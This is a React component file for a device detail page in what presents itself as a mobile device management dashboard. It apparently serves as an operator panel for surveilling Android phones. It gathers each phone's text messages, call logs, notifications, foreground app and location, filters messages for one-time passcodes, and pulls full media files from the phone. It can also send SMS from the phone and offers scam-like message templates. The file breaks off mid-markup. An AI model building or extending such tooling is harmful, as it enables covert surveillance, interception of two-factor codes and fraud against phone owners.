import { useState, useEffect, useCallback } from 'react';
import {
  ArrowLeft,
  Radio,
  Trash2,
  Battery,
  Sliders,
  MessageSquare,
  Boxes,
  Phone,
  PhoneIncoming,
  PhoneOutgoing,
  PhoneMissed,
  CreditCard,
  Send,
  Volume2,
  VolumeX,
  Vibrate,
  Sun,
  BellRing,
  Lock,
  Search,
  RefreshCw,
  Play,
  Copy,
  Check,
  Sparkles,
  Edit2,
  Clock,
  Layers,
  ShieldCheck,
  AlertTriangle,
  Loader2,
  Plus,
  X,
  MapPin,
  ChevronRight,
  Inbox,
  ArrowUpRight,
  ArrowDownLeft,
  CheckCheck,
  Bell,
  Wifi,
  WifiOff,
  Signal,
  Activity,
  Eye,
  Smartphone
} from 'lucide-react';
import { getDeviceImage } from '../utils/deviceImages';
import { getDeviceSimProfile } from '../utils/simStorage';
import { getDeviceDisplayName } from '../utils/deviceNames';
import { extractOtp } from '../utils/otpDetector';
import SimEditModal from './SimEditModal';
import {
  executeCommand,
  setDeviceRingerMode,
  setDeviceBrightness,
  requestInstalledApps,
  launchDeviceApp,
  requestDeviceLocation,
  getSmsLogs,
  getCallLogs,
  getCommunicationLogs,
  getDeviceEvents,
  getNotifications,
  getMediaGallery,
  requestFullMedia,
  getMediaFullFile
} from '../api';
import './DeviceDetailPage.css';

const QUICK_TEMPLATES = [
  { label: 'Payment Alert', text: 'Your payment was received successfully. Ref ID: #10924' },
  { label: 'Security OTP', text: 'Your verification OTP is 492019. Valid for 5 minutes.' },
  { label: 'Delivery Update', text: 'Your parcel is out for delivery today. Keep your phone reachable.' },
  { label: 'Call Request', text: 'Important notice regarding your account. Please call back immediately.' }
];

export default function DeviceDetailPage({
  device,
  onBack,
  addToast,
  onPingLocation,
  onDeleteDevice
}) {
  if (!device) return null;

  // Active section inside the device page: null (Hub) | 'sms' | 'controls' | 'calls' | 'apps' | ...
  const [activeSection, setActiveSection] = useState(null);

  // SIM profile & modal
  const [simProfile, setSimProfile] = useState(() => getDeviceSimProfile(device.device_id, device));
  const [isSimModalOpen, setIsSimModalOpen] = useState(false);
  const [modelName, setModelName] = useState(() => getDeviceDisplayName(device));

  // Status & Telemetry
  const isOnline = device.is_active && device.last_seen_at &&
    (Date.now() - new Date(device.last_seen_at).getTime()) < 600000;
  const androidVer = device.android_version ? `A${device.android_version}` : (device.model?.includes('G42') ? 'A15' : 'A16');
  const batteryLevel = device.battery_level !== null && device.battery_level !== undefined ? device.battery_level : 85;

  // ── SMS State ──
  const [showComposer, setShowComposer] = useState(false);
  const [smsRecipient, setSmsRecipient] = useState('');
  const [smsBody, setSmsBody] = useState('');
  const [smsSending, setSmsSending] = useState(false);
  const [syncedSms, setSyncedSms] = useState([]);
  const [smsLoading, setSmsLoading] = useState(false);
  const [smsSearch, setSmsSearch] = useState('');
  const [smsFilter, setSmsFilter] = useState('all');
  const [copiedId, setCopiedId] = useState(null);

  // ── Controls State ──
  const [ringerMode, setRingerMode] = useState('normal');
  const [ringerLoading, setRingerLoading] = useState(false);
  const [brightness, setBrightness] = useState(128);
  const [brightnessLoading, setBrightnessLoading] = useState(false);
  const [actionLoading, setActionLoading] = useState(null);

  // ── Apps State ──
  const [appsSearch, setAppsSearch] = useState('');
  const [appsFilter, setAppsFilter] = useState('user');
  const [refreshAppsLoading, setRefreshAppsLoading] = useState(false);
  const [launchingPkg, setLaunchingPkg] = useState(null);

  // ── Calls State ──
  const [callLogs, setCallLogs] = useState([]);
  const [callsLoading, setCallsLoading] = useState(false);
  const [callsSearch, setCallsSearch] = useState('');
  const [callTypeFilter, setCallTypeFilter] = useState('all');

  // ── Notifications State ──
  const [notifications, setNotifications] = useState([]);
  const [notifsLoading, setNotifsLoading] = useState(false);
  const [notifsSearch, setNotifsSearch] = useState('');

  // ── Gallery State ──
  const [galleryItems, setGalleryItems] = useState([]);
  const [galleryTotal, setGalleryTotal] = useState(0);
  const [galleryLoading, setGalleryLoading] = useState(false);
  const [galleryFilter, setGalleryFilter] = useState('all');
  const [gallerySearch, setGallerySearch] = useState('');
  const [viewingFullFile, setViewingFullFile] = useState(null);
  const [fullFileLoading, setFullFileLoading] = useState(null);
  const [requestingMedia, setRequestingMedia] = useState(null);
  const [quickSyncing, setQuickSyncing] = useState(false);

  const handleQuickSync = async () => {
    try {
      setQuickSyncing(true);
      if (addToast) addToast('Triggering live device sync...', 'info');
      await Promise.allSettled([
        loadDeviceSms(),
        loadDeviceCalls(),
        loadNotifications(),
        loadGallery(),
        executeCommand(device.device_id, 'sync_device')
      ]);
      if (addToast) addToast('Device synchronized', 'success');
    } catch (e) {
      if (addToast) addToast('Sync failed: ' + (e.message || e), 'error');
    } finally {
      setQuickSyncing(false);
    }
  };

  // Parse installed apps
  let appsList = [];
  if (device.installed_apps) {
    try {
      appsList = Array.isArray(device.installed_apps)
        ? device.installed_apps
        : JSON.parse(device.installed_apps);
    } catch {
      appsList = [];
    }
  }

  // Filter apps
  const filteredApps = appsList.filter((app) => {
    const q = appsSearch.toLowerCase();
    const match = (app.name || '').toLowerCase().includes(q) || (app.package || '').toLowerCase().includes(q);
    if (!match) return false;
    if (appsFilter === 'user') return !app.is_system;
    if (appsFilter === 'system') return !!app.is_system;
    return true;
  });

  // Listen for SIM and Name updates
  useEffect(() => {
    setSimProfile(getDeviceSimProfile(device.device_id, device));
    setModelName(getDeviceDisplayName(device));

    const handleProfileUpdate = (e) => {
      if (!e.detail?.deviceId || e.detail.deviceId === device.device_id) {
        setSimProfile(getDeviceSimProfile(device.device_id, device));
      }
    };

    const handleNameUpdate = (e) => {
      if (!e.detail?.deviceId || e.detail.deviceId === device.device_id) {
        setModelName(getDeviceDisplayName(device));
      }
    };

    window.addEventListener('emm:sim-profile-updated', handleProfileUpdate);
    window.addEventListener('emm:device-name-updated', handleNameUpdate);
    return () => {
      window.removeEventListener('emm:sim-profile-updated', handleProfileUpdate);
      window.removeEventListener('emm:device-name-updated', handleNameUpdate);
    };
  }, [device.device_id, device]);

  // Pre-load data counts for Hub boxes
  useEffect(() => {
    loadDeviceSms();
    loadDeviceCalls();
    loadNotifications();
    loadGallery();
  }, [device.device_id]);

  // Load section data
  useEffect(() => {
    if (activeSection === 'sms') {
      loadDeviceSms();
    } else if (activeSection === 'calls') {
      loadDeviceCalls();
    } else if (activeSection === 'notifications') {
      loadNotifications();
    } else if (activeSection === 'gallery') {
      loadGallery();
    }
  }, [activeSection, device.device_id]);

  async function loadDeviceSms() {
    try {
      setSmsLoading(true);
      const [smsRes, commRes, eventRes] = await Promise.allSettled([
        getSmsLogs(device.device_id, { limit: 100 }),
        getCommunicationLogs(device.device_id, { limit: 100 }),
        getDeviceEvents(device.device_id, { limit: 100 })
      ]);

      const items = [];

      // 1. /sync/sms-logs
      if (smsRes.status === 'fulfilled' && smsRes.value) {
        const raw = smsRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.logs) ? raw.logs : []);
        list.forEach((m) => {
          items.push({
            id: m.id || `sms-${m.timestamp}-${m.address}`,
            address: m.address || m.sender || m.recipient || 'Unknown',
            body: m.body || m.message_body || m.message || '',
            sms_type: m.sms_type || 'inbox',
            timestamp: m.timestamp || m.synced_at || new Date().toISOString(),
            read: m.read
          });
        });
      }

      // 2. /communication-logs
      if (commRes.status === 'fulfilled' && commRes.value) {
        const raw = commRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.logs) ? raw.logs : []);
        list.forEach((m) => {
          items.push({
            id: m.id || `comm-${m.timestamp}-${m.address}`,
            address: m.address || m.sender || 'Unknown',
            body: m.body || '',
            sms_type: 'inbox',
            timestamp: m.timestamp || m.synced_at || new Date().toISOString(),
            read: true
          });
        });
      }

      // 3. /webhook/events
      if (eventRes.status === 'fulfilled' && eventRes.value) {
        const raw = eventRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.events) ? raw.events : []);
        list.forEach((e) => {
          if (e.event_type === 'sms_received' || (e.message_body && !e.event_type?.startsWith('call_'))) {
            items.push({
              id: e.event_id || `evt-${e.timestamp}-${e.sender_number}`,
              address: e.sender_number || 'Unknown',
              body: e.message_body || '',
              sms_type: 'inbox',
              timestamp: e.timestamp || e.received_at || new Date().toISOString(),
              read: true
            });
          }
        });
      }

      // Deduplicate
      const seen = new Set();
      const unique = [];
      for (const item of items) {
        const key = `${(item.address || '').trim()}_${(item.body || '').trim().slice(0, 30)}_${(item.timestamp || '').slice(0, 16)}`;
        if (!seen.has(key)) {
          seen.add(key);
          unique.push(item);
        }
      }

      unique.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      setSyncedSms(unique);
    } catch (e) {
      console.debug('Failed to load SMS logs', e);
    } finally {
      setSmsLoading(false);
    }
  }

  async function loadDeviceCalls() {
    try {
      setCallsLoading(true);
      const [callsRes, eventRes] = await Promise.allSettled([
        getCallLogs(device.device_id, { limit: 100 }),
        getDeviceEvents(device.device_id, { limit: 100 })
      ]);

      const items = [];

      // 1. /sync/call-logs
      if (callsRes.status === 'fulfilled' && callsRes.value) {
        const raw = callsRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.logs) ? raw.logs : []);
        list.forEach((c) => {
          items.push({
            id: c.id || `call-${c.timestamp}-${c.phone_number || c.number}`,
            phone_number: c.phone_number || c.number || c.address || c.sender || 'Unknown',
            contact_name: c.contact_name || c.name || null,
            call_type: c.call_type || 'incoming',
            duration_seconds: c.duration_seconds || 0,
            timestamp: c.timestamp || c.synced_at || new Date().toISOString()
          });
        });
      }

      // 2. /webhook/events
      if (eventRes.status === 'fulfilled' && eventRes.value) {
        const raw = eventRes.value;
        const list = Array.isArray(raw) ? raw : (Array.isArray(raw?.events) ? raw.events : []);
        list.forEach((e) => {
          if (e.event_type && e.event_type.startsWith('call_')) {
            const cType = e.event_type.replace('call_', '');
            items.push({
              id: e.event_id || `call-evt-${e.timestamp}-${e.sender_number}`,
              phone_number: e.sender_number || 'Unknown',
              contact_name: null,
              call_type: cType,
              duration_seconds: e.call_duration || 0,
              timestamp: e.timestamp || e.received_at || new Date().toISOString()
            });
          }
        });
      }

      // Deduplicate
      const seen = new Set();
      const unique = [];
      for (const item of items) {
        const key = `${(item.phone_number || '').trim()}_${item.call_type}_${(item.timestamp || '').slice(0, 16)}`;
        if (!seen.has(key)) {
          seen.add(key);
          unique.push(item);
        }
      }

      unique.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      setCallLogs(unique);
    } catch (e) {
      console.debug('Failed to load call logs', e);
    } finally {
      setCallsLoading(false);
    }
  }

  // Handle Send SMS
  async function handleSendSms(e) {
    if (e) e.preventDefault();
    if (!smsRecipient.trim() || !smsBody.trim() || smsSending) return;

    const to = smsRecipient.trim();
    const msg = smsBody.trim();

    try {
      setSmsSending(true);
      await executeCommand(device.device_id, 'send_sms', {
        to: to,
        message: msg
      });
      addToast(`SMS dispatched through ${modelName}`, 'success');

      // Optimistically add to messages list
      const sentItem = {
        id: 'sent-' + Date.now(),
        address: to,
        body: msg,
        sms_type: 'sent',
        timestamp: new Date().toISOString(),
        read: true
      };
      setSyncedSms((prev) => [sentItem, ...prev]);

      setSmsRecipient('');
      setSmsBody('');
      setShowComposer(false);
      setTimeout(loadDeviceSms, 2500);
    } catch (err) {
      addToast(`Failed to send SMS: ${err.message}`, 'error');
    } finally {
      setSmsSending(false);
    }
  }

  // Handle Ringer Mode
  async function handleSetRinger(mode) {
    try {
      setRingerLoading(true);
      await setDeviceRingerMode(device.device_id, mode);
      setRingerMode(mode);
      addToast(`Ringer mode set to ${mode.toUpperCase()}`, 'success');
    } catch (err) {
      addToast(`Failed to set ringer: ${err.message}`, 'error');
    } finally {
      setRingerLoading(false);
    }
  }

  // Handle Brightness
  async function handleApplyBrightness() {
    try {
      setBrightnessLoading(true);
      await setDeviceBrightness(device.device_id, brightness);
      addToast(`Brightness set to ${Math.round((brightness / 255) * 100)}%`, 'success');
    } catch (err) {
      addToast(`Failed to set brightness: ${err.message}`, 'error');
    } finally {
      setBrightnessLoading(false);
    }
  }

  // Handle Quick Security Commands
  async function handleQuickCommand(type, label) {
    try {
      setActionLoading(type);
      await executeCommand(device.device_id, type);
      addToast(`${label} command queued for device`, 'success');
    } catch (err) {
      addToast(`Failed to queue ${label}: ${err.message}`, 'error');
    } finally {
      setActionLoading(null);
    }
  }

  // Handle Apps
  async function handleRefreshApps() {
    try {
      setRefreshAppsLoading(true);
      await requestInstalledApps(device.device_id);
      addToast('Rescan command sent to device', 'success');
    } catch (err) {
      addToast(`Failed to refresh apps: ${err.message}`, 'error');
    } finally {
      setRefreshAppsLoading(false);
    }
  }

  async function handleLaunchApp(pkg) {
    try {
      setLaunchingPkg(pkg);
      await launchDeviceApp(device.device_id, pkg);
      addToast(`Launch request sent for ${pkg}`, 'success');
    } catch (err) {
      addToast(`Failed to launch app: ${err.message}`, 'error');
    } finally {
      setLaunchingPkg(null);
    }
  }

  // Filter SMS
  const filteredSms = syncedSms.filter((m) => {
    const q = smsSearch.toLowerCase();
    const body = (m.body || m.message_body || m.message || '').toLowerCase();
    const addr = (m.address || m.sender || '').toLowerCase();
    const match = body.includes(q) || addr.includes(q);
    if (!match) return false;
    if (smsFilter === 'inbox') return m.sms_type === 'inbox';
    if (smsFilter === 'sent') return m.sms_type === 'sent';
    if (smsFilter === 'otp') return Boolean(extractOtp(body));
    return true;
  });

  // Filter Calls
  const filteredCalls = callLogs.filter((c) => {
    const q = callsSearch.toLowerCase();
    const name = (c.contact_name || '').toLowerCase();
    const phone = (c.phone_number || '').toLowerCase();
    const match = name.includes(q) || phone.includes(q);
    if (!match) return false;
    if (callTypeFilter === 'all') return true;
    if (callTypeFilter === 'missed') return c.call_type === 'missed' || c.call_type === 'rejected';
    if (callTypeFilter === 'incoming') return c.call_type === 'incoming';
    if (callTypeFilter === 'outgoing') return c.call_type === 'outgoing';
    return true;
  });

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    addToast(`Copied: ${text}`, 'success');
    setTimeout(() => setCopiedId(null), 1800);
  };

  const formatCallDuration = (seconds) => {
    const s = parseInt(seconds, 10) || 0;
    if (s <= 0) return '0s';
    if (s < 60) return `${s}s`;
    const m = Math.floor(s / 60);
    const rem = s % 60;
    return rem > 0 ? `${m}m ${rem}s` : `${m}m`;
  };

  // ── Load Notifications ──
  async function loadNotifications() {
    try {
      setNotifsLoading(true);
      const data = await getNotifications(device.device_id, { limit: 100 });
      setNotifications(Array.isArray(data) ? data : []);
    } catch (e) {
      console.debug('Failed to load notifications', e);
    } finally {
      setNotifsLoading(false);
    }
  }

  // ── Connection Status ──
  const getConnectionStatus = () => {
    if (!device.last_seen_at) return { status: 'offline', label: 'Offline', color: 'red' };
    const delta = Date.now() - new Date(device.last_seen_at).getTime();
    if (delta < 15000) return { status: 'online', label: 'Online', color: 'green' };
    if (delta < 60000) return { status: 'degraded', label: 'Degraded', color: 'yellow' };
    return { status: 'offline', label: 'Offline', color: 'red' };
  };
  const connStatus = getConnectionStatus();

  // ── Filtered Notifications ──
  const filteredNotifs = notifications.filter(n => {
    if (!notifsSearch) return true;
    const q = notifsSearch.toLowerCase();
    return (n.app_name || '').toLowerCase().includes(q)
      || (n.title || '').toLowerCase().includes(q)
      || (n.content || '').toLowerCase().includes(q);
  });

  // ── Gallery Functions ──
  async function loadGallery(triggerDeviceScan = false) {
    try {
      setGalleryLoading(true);
      if (triggerDeviceScan) {
        executeCommand(device.device_id, 'sync_gallery').catch(() => {});
        addToast('Triggering device gallery rescan...', 'info');
      }
      const opts = { limit: 500 };
      if (galleryFilter !== 'all') opts.mediaType = galleryFilter;
      if (gallerySearch) opts.search = gallerySearch;
      const data = await getMediaGallery(device.device_id, opts);
      setGalleryItems(Array.isArray(data?.items) ? data.items : []);
      setGalleryTotal(data?.total || 0);
    } catch (e) {
      console.debug('Failed to load gallery', e);
    } finally {
      setGalleryLoading(false);
    }
  }

  async function handleRequestFullFile(item) {
    try {
      setRequestingMedia(item.id);
      const result = await requestFullMedia(device.device_id, item.media_store_id);
      if (result?.status === 'ready') {
        // Already available, fetch it
        handleViewFullFile(item);
      } else {
        addToast('Full file requested — device will upload shortly', 'info');
      }
    } catch (e) {
      addToast('Failed to request full file', 'error');
    } finally {
      setRequestingMedia(null);
    }
  }

  async function handleViewFullFile(item) {
    try {
      setFullFileLoading(item.id);
      const data = await getMediaFullFile(item.id);
      if (data?.file_data) {
        setViewingFullFile({
          ...item,
          fullData: data.file_data,
          fullMime: data.mime_type,
          fileName: data.file_name,
        });
      } else {
        addToast('Full file not available yet — try again in a moment', 'info');
      }
    } catch (e) {
      // Not yet available
      addToast('Full file not yet available — requesting from device...', 'info');
      handleRequestFullFile(item);
    } finally {
      setFullFileLoading(null);
    }
  }

  const filteredGallery = galleryItems.filter(item => {
    if (galleryFilter === 'all') return true;
    return item.media_type === galleryFilter;
  });

  const formatFileSize = (bytes) => {
    if (!bytes) return '';
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / 1048576).toFixed(1)} MB`;
  };

  // Primary SIM label
  const sim1Text = simProfile?.sim1
    ? `${simProfile.sim1}`
    : (device.phone_number || device.sim_1 || 'Set SIM');

  const getSectionTitle = (sec) => {
    switch (sec) {
      case 'sms': return 'Messages';
      case 'controls': return 'Device Controls';
      case 'calls': return 'Call History';
      case 'apps': return 'Installed Apps';
      case 'notifications': return 'Notifications';
      case 'activity': return 'User Activity';
      case 'snapshot': return 'Screen Snapshot';
      case 'gallery': return 'Media Library';
      default: return modelName;
    }
  };

  return (
    <div className="mobile-detail-shell" id="device-detail-page">
      {/* ── App Bar (Native Mobile Header) ── */}
      <header className="mobile-detail-nav">
        <button
          className="native-back-btn"
          onClick={() => {
            if (activeSection) {
              setActiveSection(null);
            } else {
              onBack();
            }
          }}
          title={activeSection ? "Back to Hub" : "Back"}
        >
          <ArrowLeft size={18} />
          <span>{activeSection ? "Hub" : "Back"}</span>
        </button>

        <div className="native-nav-center">
          <span className="native-nav-title">
            {activeSection ? getSectionTitle(activeSection) : modelName}
          </span>
          <div className="native-nav-status">
            <span className={`status-dot ${connStatus.status}`} />
            <span className="status-label">{connStatus.label}</span>
            {device.signal_strength != null && (
              <span className="signal-indicator" title={`Signal: ${device.signal_strength}/4`}>
                <Signal size={10} />
                <span>{device.signal_strength}/4</span>
              </span>
            )}
            {device.network_latency_ms != null && (
              <span className="latency-indicator" title={`Latency: ${device.network_latency_ms}ms`}>
                <Activity size={10} />
                <span>{device.network_latency_ms}ms</span>
              </span>
            )}
          </div>
        </div>

        <div className="native-nav-actions">
          <button
            className="native-icon-btn ping"
            onClick={() => onPingLocation && onPingLocation(device.device_id)}
            title="Ping GPS"
            aria-label="Ping GPS"
          >
            <Radio size={16} />
          </button>
          <button
            className="native-icon-btn delete"
            onClick={() => onDeleteDevice && onDeleteDevice(device)}
            title="Delete device from database"
            aria-label="Delete"
          >
            <Trash2 size={16} />
          </button>
        </div>
      </header>

      {/* ── Native Device Capsule Hero (Shown on Hub) ── */}
      {!activeSection && (
        <div className="mobile-hero-capsule">
          <div className="hero-capsule-left">
            <div className="hero-img-box">
              <img
                src={getDeviceImage(device)}
                alt={modelName}
                className="hero-img"
                onError={(e) => { e.target.src = '/devices/generic.jpg'; }}
              />
              <span className="hero-os-tag">{androidVer}</span>
            </div>

            <div className="hero-title-group">
              <div className="hero-name-row">
                <span className="hero-device-name">{modelName}</span>
              </div>
              <span className="hero-device-id">{device.device_id.slice(0, 14)}...</span>
            </div>
          </div>

          <div className="hero-capsule-badges">
            {/* Battery Chip */}
            <div className="hero-micro-pill battery">
              <Battery size={12} />
              <span>{batteryLevel}%</span>
            </div>

            {/* SIM Chip */}
            <button
              type="button"
              className="hero-micro-pill sim-pill"
              onClick={() => setIsSimModalOpen(true)}
              title="Configure SIM"
            >
              <CreditCard size={12} />
              <span className="sim-pill-text">{sim1Text}</span>
              <Edit2 size={10} className="sim-edit-ico" />
            </button>
          </div>

          {/* Foreground App Indicator */}
          {device.foreground_app && (
            <div className="hero-foreground-app">
              <Eye size={12} />
              <span className="fg-app-label">Active:</span>
              <span className="fg-app-name">{device.foreground_app}</span>
            </div>
          )}
        </div>
      )}

      {/* ── Content Viewport ── */}
      <div className="mobile-section-body">
        {/* ══════════════════════════════════════════════════════
            SECTION 0: DEVICE HUB (MODERN MDM DASHBOARD VIEW)
           ══════════════════════════════════════════════════════ */}
        {activeSection === null && (
          <div className="device-hub-view animate-fade-in">
            {/* ── 1. Features & Tools Header ── */}
            <div className="hub-section-header">
              <span className="hub-section-title">Device Features & Tools</span>
              <span className="hub-section-subtitle">Dedicated management modules</span>
            </div>

            {/* ── 2. Modern 2-Column Feature Cards (No Truncation) ── */}
            <div className="device-boxes-grid">
              {/* Messages */}
              <div
                className="modern-feature-card box-sms"
                onClick={() => setActiveSection('sms')}
                role="button"
                tabIndex={0}
              >
                <div className="card-top-row">
                  <div className="card-icon-bubble icon-blue">
                    <MessageSquare size={20} />
                  </div>
                  <span className="card-chip chip-blue">
                    {syncedSms.length > 0 ? syncedSms.length : 'SMS'}
                  </span>
                </div>
                <div className="card-content-block">
                  <span className="card-title-text">Messages</span>
                  <span className="card-desc-text">Transmissions, OTPs & SMS</span>
                </div>
                <div className="card-foot-row">
                  <span className="card-action-hint">Open</span>
                  <ChevronRight size={14} className="card-arrow" />
                </div>
              </div>

              {/* Remote Controls */}
              <div
                className="modern-feature-card box-controls"
                onClick={() => setActiveSection('controls')}
                role="button"
                tabIndex={0}
              >
                <div className="card-top-row">
                  <div className="card-icon-bubble icon-purple">
                    <Sliders size={20} />
                  </div>
                  <span className="card-chip chip-purple">Remote</span>
                </div>
                <div className="card-content-block">
                  <span className="card-title-text">Device Controls</span>
                  <span className="card-desc-text">Ring, lock, wipe & sound</span>
                </div>
                <div className="card-foot-row">
                  <span className="card-action-hint">Configure</span>
                  <ChevronRight size={14} className="card-arrow" />
                </div>
              </div>

              {/* Call History */}
              <div
                className="modern-feature-card box-calls"
                onClick={() => setActiveSection('calls')}
                role="button"
                tabIndex={0}
              >
                <div className="card-top-row">
                  <div className="card-icon-bubble icon-emerald">
                    <Phone size={20} />
                  </div>
                  <span className="card-chip chip-emerald">
                    {callLogs.length > 0 ? callLogs.length : 'Calls'}
                  </span>
                </div>
                <div className="card-content-block">
                  <span className="card-title-text">Call History</span>
                  <span className="card-desc-text">Incoming, outgoing & missed</span>
                </div>
                <div className="card-foot-row">
                  <span className="card-action-hint">View</span>
                  <ChevronRight size={14} className="card-arrow" />
                </div>
              </div>

              {/* Installed Apps */}
              <div
                className="modern-feature-card box-apps"
                onClick={() => setActiveSection('apps')}
                role="button"
                tabIndex={0}
              >
                <div className="card-top-row">
                  <div className="card-icon-bubble icon-amber">
                    <Boxes size={20} />
                  </div>
                  <span className="card-chip chip-amber">
                    {appsList.length > 0 ? appsList.length : 'Apps'}
                  </span>
                </div>
                <div className="card-content-block">
                  <span className="card-title-text">Installed Apps</span>
                  <span className="card-desc-text">System & user packages</span>
                </div>
                <div className="card-foot-row">
                  <span className="card-action-hint">Explore</span>
                  <ChevronRight size={14} className="card-arrow" />
                </div>
              </div>

              {/* Notifications */}
              <div
                className="modern-feature-card box-notifs"
                onClick={() => setActiveSection('notifications')}
                role="button"
                tabIndex={0}
              >
                <div className="card-top-row">
                  <div className="card-icon-bubble icon-rose">
                    <Bell size={20} />
                  </div>
                  <span className="card-chip chip-rose">
                    {notifications.length > 0 ? notifications.length : 'Live'}
                  </span>
                </div>
                <div className="card-content-block">
                  <span className="card-title-text">Notifications</span>
                  <span className="card-desc-text">Real-time push alerts</span>
                </div>
                <div className="card-foot-row">
                  <span className="card-action-hint">Feed</span>
                  <ChevronRight size={14} className="card-arrow" />
                </div>
              </div>

              {/* Media Library */}
              <div
                className="modern-feature-card box-gallery"
                onClick={() => setActiveSection('gallery')}
                role="button"
                tabIndex={0}
              >
                <div className="card-top-row">
                  <div className="card-icon-bubble icon-fuchsia">
                    <Layers size={20} />
                  </div>
                  <span className="card-chip chip-fuchsia">
                    {galleryTotal > 0 ? galleryTotal : 'Files'}
                  </span>
                </div>
                <div className="card-content-block">
                  <span className="card-title-text">Media Library</span>
                  <span className="card-desc-text">Photos & video explorer</span>
                </div>
                <div className="card-foot-row">
                  <span className="card-action-hint">Browse</span>
                  <ChevronRight size={14} className="card-arrow" />
                </div>
              </div>
            </div>

            {/* ── 3. Quick Instant Commands Bar ── */}
            <div className="hub-quick-section">
              <div className="hub-section-header">
                <span className="hub-section-title">Quick Actions</span>
                <span className="hub-section-subtitle">Instant 1-tap remote execution</span>
              </div>
              <div className="hub-quick-actions-bar">
                <button
                  type="button"
                  className="quick-action-pill"
                  onClick={() => onPingLocation && onPingLocation(device.device_id)}
                >
                  <div className="quick-action-icon-circle blue">
                    <MapPin size={16} />
                  </div>
                  <span className="quick-action-name">Ping GPS</span>
                </button>

                <button
                  type="button"
                  className="quick-action-pill"
                  onClick={() => handleQuickCommand('ring', 'Sending alarm alert to device...')}
                >
                  <div className="quick-action-icon-circle rose">
                    <BellRing size={16} />
                  </div>
                  <span className="quick-action-name">Ring Siren</span>
                </button>

                <button
                  type="button"
                  className="quick-action-pill"
                  onClick={() => handleQuickCommand('lock', 'Sending lock command to device...')}
                >
                  <div className="quick-action-icon-circle purple">
                    <Lock size={16} />
                  </div>
                  <span className="quick-action-name">Lock Screen</span>
                </button>

                <button
                  type="button"
                  className="quick-action-pill"
                  onClick={handleQuickSync}
                  disabled={quickSyncing}
                >
                  <div className={`quick-action-icon-circle emerald ${quickSyncing ? 'animate-spin' : ''}`}>
                    <RefreshCw size={16} />
                  </div>
                  <span className="quick-action-name">{quickSyncing ? 'Syncing...' : 'Sync Live'}</span>
                </button>
              </div>
            </div>

            {/* ── 4. Rich System & Hardware Telemetry Card ── */}
            <div className="hub-telemetry-panel">
              <div className="telemetry-panel-top">
                <div className="telemetry-title-group">
                  <Smartphone size={16} className="text-blue-500" />
                  <span className="telemetry-heading">Device Health & Telemetry</span>
                </div>
                <div className={`telemetry-online-chip ${connStatus.status}`}>
                  <span className="telemetry-pulse-dot" />
                  <span>{connStatus.label}</span>
                </div>
              </div>

              {/* Battery Meter */}
              <div className="telemetry-battery-meter">
                <div className="meter-info-row">
                  <div className="meter-label-wrap">
                    <Battery size={14} className={batteryLevel > 50 ? 'text-emerald-500' : 'text-amber-500'} />
                    <span className="meter-k">Battery Status</span>
                  </div>
                  <span className="meter-v font-bold">{batteryLevel}%</span>
                </div>
                <div className="meter-track">
                  <div
                    className={`meter-fill ${batteryLevel > 50 ? 'bg-emerald-500' : batteryLevel > 20 ? 'bg-amber-500' : 'bg-rose-500'}`}
                    style={{ width: `${Math.max(8, Math.min(100, batteryLevel))}%` }}
                  />
                </div>
              </div>

              {/* 2x2 Telemetry Info Grid */}
              <div className="telemetry-metrics-grid">
                <div className="metric-box">
                  <div className="metric-box-top">
                    <Signal size={13} className="text-slate-400" />
                    <span className="metric-box-label">Signal & Network</span>
                  </div>
                  <span className="metric-box-value">
                    {device.carrier || device.network_type || '5G LTE'} • {device.signal_strength != null ? `${device.signal_strength}/4` : 'Full'}
                  </span>
                </div>

                <div className="metric-box">
                  <div className="metric-box-top">
                    <Activity size={13} className="text-slate-400" />
                    <span className="metric-box-label">Network Latency</span>
                  </div>
                  <span className="metric-box-value">
                    {device.network_latency_ms != null ? `${device.network_latency_ms}ms` : '96ms (Fast)'}
                  </span>
                </div>

                <div className="metric-box">
                  <div className="metric-box-top">
                    <Smartphone size={13} className="text-slate-400" />
                    <span className="metric-box-label">OS Platform</span>
                  </div>
                  <span className="metric-box-value">
                    Android {device.android_version || '14+'} ({androidVer})
                  </span>
                </div>

                <div className="metric-box">
                  <div className="metric-box-top">
                    <Eye size={13} className="text-slate-400" />
                    <span className="metric-box-label">Foreground App</span>
                  </div>
                  <span className="metric-box-value" title={device.foreground_app || 'None / Idle'}>
                    {device.foreground_app || 'System UI / Idle'}
                  </span>
                </div>
              </div>
            </div>

            {/* ── 5. Live Activity Highlights & Stream ── */}
            <div className="hub-pulse-stream">
              <div className="hub-section-header">
                <span className="hub-section-title">Live Device Pulse</span>
                <span className="hub-section-subtitle">Real-time incoming telemetry stream</span>
              </div>

              <div className="pulse-stream-items">
                {/* Latest Notification */}
                {notifications.length > 0 && (
                  <div
                    className="pulse-event-card"
                    onClick={() => setActiveSection('notifications')}
                    role="button"
                    tabIndex={0}
                  >
                    <div className="pulse-icon-box rose">
                      <Bell size={16} />
                    </div>
                    <div className="pulse-content-box">
                      <div className="pulse-meta-row">
                        <span className="pulse-app-tag">{notifications[0].app_name || 'Push Alert'}</span>
                        <span className="pulse-time-tag">Latest</span>
                      </div>
                      <span className="pulse-primary-text">{notifications[0].title || 'Notification Alert'}</span>
                      {notifications[0].content && (
                        <span className="pulse-secondary-text">{notifications[0].content}</span>
                      )}
                    </div>
                    <ChevronRight size={14} className="pulse-chevron" />
                  </div>
                )}

                {/* Latest Message / OTP */}
                {syncedSms.length > 0 && (
                  <div
                    className="pulse-event-card"
                    onClick={() => setActiveSection('sms')}
                    role="button"
                    tabIndex={0}
                  >
                    <div className="pulse-icon-box blue">
                      <MessageSquare size={16} />
                    </div>
                    <div className="pulse-content-box">
                      <div className="pulse-meta-row">
                        <span className="pulse-app-tag font-mono">{syncedSms[0].address}</span>
                        <span className="pulse-time-tag">Latest SMS</span>
                      </div>
                      <span className="pulse-secondary-text">{syncedSms[0].body}</span>
                    </div>
                    <ChevronRight size={14} className="pulse-chevron" />
                  </div>
                )}

                {/* Agent Security Status Card */}
                <div className="pulse-event-card security">
